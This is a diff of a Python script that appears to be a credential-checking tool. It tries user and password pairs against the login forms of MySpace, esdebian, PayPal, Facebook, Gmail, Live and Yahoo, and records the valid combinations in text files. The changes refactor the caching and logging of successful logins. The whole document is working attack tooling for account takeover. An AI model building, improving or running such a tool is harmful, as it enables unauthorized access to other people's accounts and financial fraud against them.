@@ -24,6 +24,7 @@ class Discovers(list):
 
 discovers = Discovers()
 
+
 def write(text, destination):
     f = open(destination, "a")
     f.write("%s\n" % text)
@@ -40,22 +41,22 @@ def read(filename):
     return pairs
 
 
-
-
 def cache(func):
-    truesname = func.func_name + ".txt"
-    falsesname = "no-" + func.func_name + ".txt"
-    nonesname = "none-" + func.func_name + ".txt"
+    funcname = func.func_name
+    truesname = funcname + ".txt"
+    falsesname = "no-" + funcname + ".txt"
+    nonesname = "none-" + funcname + ".txt"
 
     trues = set(read(truesname))
     falses = set(read(falsesname))
 
     @wraps(func)
+    @Verbose(VERBOSE)
     def dfunc(*args, **kwargs):
         if args in trues:
-            return True
+            result = True
         elif args in falses:
-            return False
+            result = False
         else:
             result = func(*args, **kwargs)
             line = ";".join(args)
@@ -65,9 +66,10 @@ def cache(func):
                 write(line, falsesname)
             else:
                 write(line, nonesname)
+        if result:
+            debug("%s: %s, %s" % (funcname, args[0], args[1]))
 
     return dfunc
-
 
 
 def ismail(user):
@@ -81,11 +83,12 @@ def ismail(user):
     else:
         return False
 
+
 @discovers
 def myspace(user, password):
     if ismail(user):
         b.clear_cookies()
-        form = b.get_forms("http://myspace.com", cache=1000)[1]
+        form = b.get_forms("http://myspace.com")[1]
         form["""ctl00$ctl00$cpMain$cpMain$LoginBox$Email_Textbox"""] = user
         form["""ctl00$ctl00$cpMain$cpMain$LoginBox$Password_Textbox"""] = password
         try:
@@ -102,11 +105,12 @@ def myspace(user, password):
     else:
         return False
 
+
 @discovers
 def esdebian(user, password):
     if ismail(user):
         b.clear_cookies()
-        form = b.get_forms("http://www.esdebian.org", cache=1000)[1]
+        form = b.get_forms("http://www.esdebian.org")[1]
         form["name"] = user
         form["pass"] = password
         try:
@@ -123,12 +127,13 @@ def esdebian(user, password):
     else:
         return False
 
+
 @discovers
 def paypal(user, password):
     if ismail(user):
         b.clear_cookies()
         form = b.get_forms("https://www.paypal.com/ar/cgi-bin/webscr"
-            "?cmd=_login-run", cache=0*1000)[1]
+            "?cmd=_login-run")[1]
         form["login_email"] = user
         form["login_password"] = password
         try:
@@ -154,7 +159,7 @@ def paypal(user, password):
 def facebook(user, password):
     if ismail(user):
         b.clear_cookies()
-        form = b.get_forms("http://facebook.com", cache=1000)[0]
+        form = b.get_forms("http://facebook.com")[0]
         form["email"] = user
         form["pass"] = password
         try:
@@ -195,8 +200,7 @@ def gmail(user, password):
             return None
     else:
         return False
-    debug("gmail: %s, %s" % (user, password))
-    return "gmail.com"
+    return True
 
 
 @discovers
@@ -222,8 +226,7 @@ def live(user, password):
             return None
     else:
         return False
-    debug("live: %s, %s" % (user, password))
-    return "live.com"
+    return True
 
 
 @discovers
@@ -246,8 +249,7 @@ def yahoo(user, password):
             return None
     else:
         return False
-    debug("yahoo: %s, %s" % (user, password))
-    return "yahoo.com"
+    return True
 
 
 def main():
